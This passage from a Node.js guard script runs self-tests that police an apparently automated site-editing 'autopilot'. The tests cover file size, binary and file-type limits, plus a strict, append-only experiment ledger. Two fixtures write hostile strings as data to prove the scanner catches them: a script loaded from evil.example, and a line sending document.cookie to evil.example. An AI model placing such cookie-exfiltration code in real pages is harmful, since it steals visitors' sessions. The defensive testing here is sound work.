    expect('1,500 changed lines', { setup: () => write('components/Long.tsx', Array.from({ length: 1500 }, (_, i) => `export const v${i} = ${i};`).join('\n') + '\n') });
    expect('a multi-megabyte line of text', { setup: () => write('components/Hero.tsx', `export const HERO = "data:image/png;base64,${'A'.repeat(5 * 1024 * 1024)}";\n`), rules: ['size'], messages: ['KB of text', 'characters'] });
    expect('an SVG with a 5 MB inlined image', { setup: () => write('public/hero.svg', `<svg><image href="data:image/png;base64,${'A'.repeat(5 * 1024 * 1024)}"/></svg>\n`), rules: ['size'], messages: ['KB of text'] });
    expect('a line over 3,000 characters', { setup: () => write('components/Card.tsx', component(`const s = '${'x'.repeat(3001)}';`)), rules: ['size'], messages: ['characters'] });
    expect('more than 1 MB of text in total', { setup: () => { for (let i = 0; i < 6; i += 1) write(`public/t${i}.txt`, `${'word '.repeat(39000)}\n`); }, rules: ['size'], messages: ['MB of text'] });
    const png = (kb) => Buffer.concat([Buffer.from('\x89PNG\r\n\x1a\n', 'binary'), Buffer.alloc(8), Buffer.alloc(kb * 1024 - 16, 1)]);
    const gif = (kb) => Buffer.concat([Buffer.from('GIF89a', 'binary'), Buffer.alloc(kb * 1024 - 6, 0x21)]);
    expect('binary under public', { setup: () => write('public/og/new.png', png(100)) });
    expect('binary outside public', { setup: () => write('components/x.png', png(1)), rules: ['binary'] });
    expect('a TrueType font under public', { setup: () => write('public/fonts/Display.ttf', Buffer.concat([Buffer.from([0, 1, 0, 0]), Buffer.alloc(2048, 7)])) });
    expect('a font outside public', { setup: () => write('components/Display.otf', Buffer.concat([Buffer.from('OTTO', 'binary'), Buffer.alloc(2048, 0)])), rules: ['binary'] });
    expect('Next.js icons and share images under app', { setup: () => { write('app/apple-icon.png', png(20)); write('app/icon1.png', png(5)); write('app/finish-times/opengraph-image.png', png(80)); write('app/favicon.ico', png(4)); } });
    expect('another image under app', { setup: () => write('app/hero.png', png(20)), rules: ['binary'], messages: ['app/hero.png'] });
    expect('a GIF with no NUL byte outside public', { setup: () => write('components/blob.gif', gif(10)), rules: ['binary'], messages: ['components/blob.gif'] });
    expect('binary deleted under public', { setup: () => remove('public/og/card.png') });
    expect('binary over 600 KB', { setup: () => write('public/og/big.png', png(601)), rules: ['binary'], messages: ['601 KB'] });
    expect('a GIF over 600 KB with no NUL byte', { setup: () => write('public/og/big.gif', gif(700)), rules: ['binary'], messages: ['700 KB'] });
    expect('binaries over 2 MB in total', { setup: () => { for (let i = 0; i < 4; i += 1) write(`public/og/b${i}.png`, png(550)); }, rules: ['size'] });
    expect('a NUL byte cannot hide public HTML from the scan', { setup: () => write('public/landing.html', "\0<script src='https://evil.example/t.js'></script>\n"), rules: ['file-type'], messages: ['not UTF-8 text'] });
    expect('a NUL byte cannot hide a public script from the scan', { setup: () => write('public/w.js', "/*\0*/ fetch('https://evil.example/?'+document.cookie)\n"), rules: ['file-type'] });
    expect('symbolic link', { setup: () => fs.symlinkSync('/etc/hostname', path.join(dir, 'public/link.txt')), rules: ['file-type'] });

    // Ledger: shape
    expect('no ledger line added', { ledger: false, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), rules: ['ledger'], messages: ['adds no line'] });
    const ledgerCase = (label, lineText, wanted = ['ledger'], options = {}) => expect(label, { ledger: false, ...options, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${lineText}\n`), rules: wanted });
    ledgerCase('ledger line is not JSON', '{not json');
    ledgerCase('ledger line is an array', '[1,2]');
    ledgerCase('ledger key missing', JSON.stringify((({ hypothesis, ...rest }) => rest)(JSON.parse(proposal()))));
    ledgerCase('ledger id malformed', entry('Home Hero'));
    ledgerCase('ledger id reused', entry('2026-10-01-first'));
    ledgerCase('ledger date invalid', proposal({ date: '2026-02-30' }));
    ledgerCase('ledger kind unknown', proposal({ kind: 'tweak' }));
    ledgerCase('ledger status unknown', proposal({ status: 'done' }));
    ledgerCase('ledger verdict unknown', proposal({ verdict: 'win' }));
    ledgerCase('ledger pr is a string', proposal({ pr: '61' }));
    ledgerCase('ledger guardrails not an array', proposal({ guardrails: 'bounce' }));
    ledgerCase('ledger baseline not an object', proposal({ baseline: 0.4 }));
    ledgerCase('ledger result not an object', proposal({ result: 'good' }));
    ledgerCase('ledger evaluate_after null for a change', proposal({ evaluate_after: null }));
    ledgerCase('ledger evaluate_after null for a fix', proposal({ kind: 'fix', evaluate_after: null }), []);
    ledgerCase('ledger evaluate_after null for a revert', proposal({ kind: 'revert', evaluate_after: null }), []);
    ledgerCase('ledger evaluate_after null for a conclusion', proposal({ kind: 'conclude', evaluate_after: null }), []);
    ledgerCase('ledger line wrapped over two lines', `${proposal().replace(',"title"', ',\n"title"')}`, ['ledger'], { messages: ['one JSON object on one line'] });
    ledgerCase('ledger with extra keys', proposal({ notes: 'context', evaluated_on: null, experiment: 'home-hero' }), []);
    // Ledger: experiments need explicit, finite, pre-registered stopping rules; other kinds keep their schema.
    const EXPERIMENT = { kind: 'experiment', min_sample: 150, max_days: 42 };
    ledgerCase('experiment with the default sample and duration', proposal(EXPERIMENT), []);
    ledgerCase('experiment with the smallest sample and duration', proposal({ ...EXPERIMENT, min_sample: 1, max_days: 1 }), []);
    ledgerCase('experiment with the largest exactly representable integer sample', proposal({ ...EXPERIMENT, min_sample: Number.MAX_SAFE_INTEGER }), []);
    for (const field of ['min_sample', 'max_days']) {
      for (const [label, value] of [['missing', undefined], ['null', null], ['zero', 0], ['negative', -1], ['fraction', 1.5], ['string', '150'], ['boolean', true], ['array', [150]], ['object', { n: 150 }], ['unsafe integer', Number.MAX_SAFE_INTEGER + 1]]) {
        ledgerCase(`experiment ${field} is ${label}`, proposal({ ...EXPERIMENT, [field]: value }), ['ledger'], { messages: [`requires "${field}"`] });
      }
      ledgerCase(`experiment ${field} overflows to infinity`, proposal(EXPERIMENT).replace(`"${field}":${EXPERIMENT[field]}`, `"${field}":1e309`), ['ledger'], { messages: [`requires "${field}"`] });
    }
    ledgerCase('experiment duration exceeds 42 days', proposal({ ...EXPERIMENT, max_days: 43 }), ['ledger'], { messages: ['"max_days" to be an integer from 1 to 42'] });
    ledgerCase('experiment cannot substitute evaluate_after for stopping rules', proposal({ kind: 'experiment' }), ['ledger'], { messages: ['requires "min_sample"', 'requires "max_days"'] });
    ledgerCase('change may leave duration null', proposal({ min_sample: 150, max_days: null }), []);
    ledgerCase('closed-unmerged experiment keeps valid stopping rules', entry('2026-09-20-stuck', { ...EXPERIMENT, status: 'reverted', verdict: 'inconclusive', pr: 55 }), [], { pr: 61 });
    ledgerCase('closed-unmerged exception does not waive experiment stopping rules', entry('2026-09-20-stuck', { kind: 'experiment', status: 'reverted', verdict: 'inconclusive', pr: 55 }), ['ledger'], { pr: 61, messages: ['requires "min_sample"', 'requires "max_days"'] });
    // Ledger: each new proposal belongs to this branch, including ledger-only proposals.
    for (const kind of LEDGER_KINDS) {
      const fields = { ...(kind === 'experiment' ? EXPERIMENT : {}), kind };
      ledgerCase(`${kind} entry matches the branch id`, proposal(fields), []);
      ledgerCase(`${kind} entry has another slug`, entry('2026-10-14-other', fields), ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    }
    ledgerCase('new entry date in range does not excuse an id with another date', entry('2026-10-13-test'), ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    ledgerCase('new entry id cannot merely extend the branch id', entry(`${CHANGE_ID}-extra`), ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    ledgerCase('new entry id is bound even when its pr matches', entry('2026-10-14-other', { pr: 61 }), ['ledger'], { pr: 61, messages: [`"id" must be "${CHANGE_ID}"`] });
    ledgerCase('new entry id follows another valid branch', entry('2026-10-15-home-hero'), [], { branch: 'autopilot/2026-10-15-home-hero' });
    ledgerCase('an extra proposal cannot borrow the matching entry id', `${proposal()}\n${entry('2026-10-14-other')}`, ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    // Ledger: a new entry is pre-registered
    ledgerCase('new entry already concluded', proposal({ status: 'concluded', verdict: 'keep', result: { delta: 0.1 } }));
    ledgerCase('new change already shipped', proposal({ status: 'shipped' }));
    ledgerCase('new revert entry already shipped', proposal({ kind: 'revert', evaluate_after: null, status: 'shipped' }));
    ledgerCase('new entry with a ship date', proposal({ shipped_on: '2026-10-14' }));
    ledgerCase('new entry with a verdict', proposal({ verdict: 'keep' }));
    ledgerCase('new entry with a result', proposal({ result: { delta: 0.1 } }));
    ledgerCase('new entry backdated', proposal({ date: '2026-09-01' }));
    ledgerCase('new entry dated in the future', proposal({ date: '2026-10-20' }));
    ledgerCase('new entry dated the day before the branch', proposal({ date: '2026-10-13' }), []);
    ledgerCase('new entry naming another pull request', proposal({ pr: 12 }), ['ledger'], { pr: 61 });
    ledgerCase('new entry naming this pull request', proposal({ pr: 61 }), [], { pr: 61 });
    ledgerCase('record of a pull request that closed unmerged', entry('2026-09-20-stuck', { status: 'reverted', verdict: 'inconclusive', pr: 55, notes: 'Closed after 7 days.' }), [], { pr: 61 });
    ledgerCase('closed-unmerged record may have a null verdict', entry('2026-09-20-stuck', { status: 'reverted', verdict: null, pr: 55 }), [], { pr: 61 });
    ledgerCase('record of a closed pull request with verdict revert', entry('2026-09-20-stuck', { status: 'reverted', verdict: 'revert', pr: 55 }), ['ledger'], { pr: 61 });
    const closed = (id = '2026-09-20-stuck') => entry(id, { status: 'reverted', verdict: 'inconclusive', pr: 55 });
    for (const id of ['2026-09-20-stuck', CHANGE_ID]) {
      expect(`a closed-unmerged record (${id}) cannot register a site change`, { ledger: false, setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${closed(id)}\n`); write('components/Card.tsx', 'export const y = 2;\n'); }, rules: ['ledger'], messages: ['a closed-unmerged record does not pre-register a site change'] });
    }
    expect('a site change and a closed-unmerged record with its own proposal', { setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${closed()}\n`); write('components/Card.tsx', 'export const y = 2;\n'); } });
    expect('ten new ledger lines', { ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), Array.from({ length: 10 }, (_, i) => `${entry(`2026-10-14-bulk-${i}`, { status: 'reverted', verdict: 'inconclusive', pr: 40 + i })}\n`).join('')) });
    expect('eleven new ledger lines', { ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), Array.from({ length: 11 }, (_, i) => `${entry(`2026-10-14-bulk-${i}`, { status: 'reverted', verdict: 'inconclusive', pr: 40 + i })}\n`).join('')), rules: ['ledger'], messages: ['adds 11 lines'] });
    // Ledger: existing entries
    expect('existing ledger line removed', { ledger: false, setup: () => write(LEDGER, `${proposal()}\n`), rules: ['ledger'] });
    expect('existing ledger line moved', { ledger: false, setup: () => write(LEDGER, `${proposal()}\n${BASE_LEDGER}`), rules: ['ledger'], messages: ['moved from line 1'] });
    expect('existing ledger entry title changed', { ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, title: 'Rewritten' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"title"'] });
    expect('existing ledger entry decision rule changed', { ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, decision_rule: 'Anything goes.' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"decision_rule"'] });
    expect('existing ledger entry evaluated', { ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { status: 'concluded', pr: 60, verdict: 'keep', result: { rate: 0.45 }, evaluated_on: '2026-10-14', notes: 'Held up.' })}\n${proposal({ kind: 'conclude' })}\n`) });
    expect('existing ledger entry pr changed', { ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, pr: 12 })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"pr" was already 60'] });
    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'main-judged');
    write(LEDGER, `${entry('2026-10-01-hero', { status: 'reverted', pr: 58, verdict: 'revert', result: { delta: -0.04 } })}\n${entry('2026-10-02-menu', { status: 'proposed' })}\n`);
    run('add', '-A'); run('commit', '-q', '-m', 'judged');
    expect('a reverted entry flipped to keep', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-hero', { status: 'shipped', pr: 58, verdict: 'keep', result: { delta: 0.06 } })}\n${entry('2026-10-02-menu', { status: 'proposed' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"status" cannot go from "reverted"', '"verdict" was already', '"result" was already'] });
    const HERO = entry('2026-10-01-hero', { status: 'reverted', pr: 58, verdict: 'revert', result: { delta: -0.04 } });
    expect('a proposed entry shipped with its pull request and date', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n${proposal()}\n`) });
    expect('a proposed entry marked shipped and judged in one pull request', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'concluded', pr: 59, shipped_on: '2026-10-03', verdict: 'keep', result: { rate: 0.45 }, evaluated_on: '2026-10-14' })}\n${proposal()}\n`) });
    expect('a ship date that is not a date', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59, shipped_on: 'Oct 3' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"shipped_on" must be null or a YYYY-MM-DD date'] });
    // Bookkeeping: a pull request that changes only existing ledger lines, the backlog and the learnings needs no new line.
    expect('bookkeeping only: ledger, backlog and learnings', { base: 'main-judged', ledger: false, setup: () => { write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n`); write('autopilot/backlog.md', '# Backlog\n- Menu shipped.\n'); write('autopilot/LEARNINGS.md', '- 2026-10-14 (recordings, 9): phones stop at chapter 2.\n'); } });
    expect('bookkeeping only: the backlog alone', { ledger: false, setup: () => write('autopilot/backlog.md', '# Backlog\n- Re-ranked.\n') });
    expect('bookkeeping and a site change still need a new line', { base: 'main-judged', ledger: false, setup: () => { write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59 })}\n`); write('components/Card.tsx', 'export const y = 2;\n'); }, rules: ['ledger'], messages: ['adds no line'] });
    // Deleted lines are reported once, as deletions (as after a plain git revert of the merge).
    expect('an earlier line deleted and a revert entry appended', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${HERO}\n${proposal({ kind: 'revert', evaluate_after: null })}\n`), rules: ['ledger'], messages: ['existing entry "2026-10-02-menu" was removed'], absent: ['adds no line', 'moved from line', '2026-10-01-hero'] });
    expect('the first line deleted', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${entry('2026-10-02-menu', { status: 'proposed' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['existing entry "2026-10-01-hero" was removed'], absent: ['adds no line', 'moved from line', '"2026-10-02-menu"'] });
    expect('an empty change still needs a ledger line', { ledger: false, setup: () => {}, rules: ['ledger'] });
    // Ledger: a base that is already untidy does not block every later pull request.
    const untidyBase = (label, text) => { run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', label); write(LEDGER, text); run('add', '-A'); run('commit', '-q', '-m', label); return label; };
    expect('a trailing blank line on the base', { base: untidyBase('base-blank', `${BASE_LEDGER}\n`), ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`) });
    expect('a blank line on the base replaced by the new entry', { base: 'base-blank', ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${proposal()}\n`) });
    expect('a byte-order mark on the base', { base: untidyBase('base-bom', `﻿${BASE_LEDGER}`), ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`) });
    expect('an invalid entry already on the base is a warning', { base: untidyBase('base-invalid', `${entry('2026-10-01-old', { evaluate_after: null })}\n`), ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`), warned: ['evaluate_after'] });
    const oldExperiment = (extra = {}) => entry('2026-10-01-experiment', { ...EXPERIMENT, ...extra });
    const experimentBase = untidyBase('base-experiment', `${oldExperiment()}\n`);
    expect('bookkeeping ships an experiment with its historical id and stopping rules', { base: experimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n`) });
    expect('bookkeeping concludes an experiment with its historical id and stopping rules', { base: experimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ status: 'concluded', pr: 59, shipped_on: '2026-10-03', verdict: 'keep-control', result: { control: 80, variant: 75 }, evaluated_on: '2026-10-14' })}\n`) });
    for (const [field, value] of [['min_sample', 200], ['max_days', 21], ['min_sample', undefined], ['max_days', null]]) {
      expect(`existing experiment ${field} cannot change to ${value}`, { base: experimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ [field]: value })}\n`), rules: ['ledger'], messages: [`changed "${field}"`] });
    }
    const invalidExperimentBase = untidyBase('base-invalid-experiment', `${oldExperiment({ min_sample: undefined, max_days: 43 })}\n`);
    expect('unchanged historical experiment schema errors are warnings', { base: invalidExperimentBase, setup: () => {}, warned: ['requires "min_sample"', 'requires "max_days"'] });
    expect('edited historical experiment still has its schema checked', { base: invalidExperimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ min_sample: undefined, max_days: 43, notes: 'Still running.' })}\n`), rules: ['ledger'], messages: ['requires "min_sample"', 'requires "max_days"'] });
    const shippedBase = untidyBase('base-shipped', `${entry('2026-10-01-first', { ...FIRST, shipped_on: '2026-10-02' })}\n`);
    expect('a ship date changed once set', { base: shippedBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, shipped_on: '2026-10-03' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"shipped_on" was already'] });

    // The guard reads commits: work not yet committed fails the check; an untracked file is a warning.
    expect('a change not yet committed', { setup: () => {}, dirty: () => write('components/Card.tsx', component('window.localStorage.setItem("k", v);')), rules: ['uncommitted'], messages: ['components/Card.tsx', 'not committed'] });
    expect('an untracked file is a warning', { setup: () => {}, dirty: () => write('components/Draft.tsx', 'export const d = 1;\n'), warned: ['untracked'] });

    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'main-noledger'); remove(LEDGER); run('add', '-A'); run('commit', '-q', '-m', 'no ledger');
    expect('first ledger line on a base without one', { base: 'main-noledger', ledger: false, setup: () => write(LEDGER, `${proposal()}\n`) });
    expect('ledger missing on head', { base: 'main-noledger', ledger: false, setup: () => write('components/Card.tsx', 'export const z = 3;\n'), rules: ['ledger'], messages: ['missing'] });
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
  if (failures.length) {
    console.error(`autopilot-guard self-test: ${failures.length} of ${cases} cases failed`);
    for (const failure of failures) console.error(`  ${failure}`);
    return 1;
  }
  console.log(`autopilot-guard self-test: ${cases} cases passed (${PROTECTED.length} protected patterns, ${ALLOWED.length} allowed areas, ${FORBIDDEN.length + FORBIDDEN_MARKUP.length} forbidden patterns, ${BANNED.length} banned phrases)`);
  return 0;
}

// ---------- CLI ----------

function main(argv) {
  if (argv.includes('--self-test')) return selfTest();
  const option = (name) => { const at = argv.indexOf(name); return at >= 0 ? argv[at + 1] : undefined; };
  const json = argv.includes('--json');
  try {
    const prArg = option('--pr');
    const pr = prArg ? Number(prArg) : null;
    if (prArg && !(Number.isInteger(pr) && pr > 0)) throw new GitError('--pr must be a pull request number');
    const result = check({ base: option('--base'), head: option('--head'), branch: option('--branch'), pr });
    console.log(json ? JSON.stringify(result, null, 2) : report(result));
    return result.ok ? 0 : 1;
  } catch (error) {
    if (!(error instanceof GitError)) throw error;
    if (json) console.log(JSON.stringify({ ok: false, error: error.message }, null, 2));
    console.error(`autopilot-guard: ${error.message}\nUsage: node scripts/autopilot-guard.cjs --base <git-ref> --head <git-ref> [--branch <name>] [--pr <n>] [--json] | --self-test`);
    return 2;
  }
}

module.exports = { PROTECTED, ALLOWED, FORBIDDEN, BANNED, LIMITS, check, protectedBy };

if (require.main === module) process.exitCode = main(process.argv.slice(2));
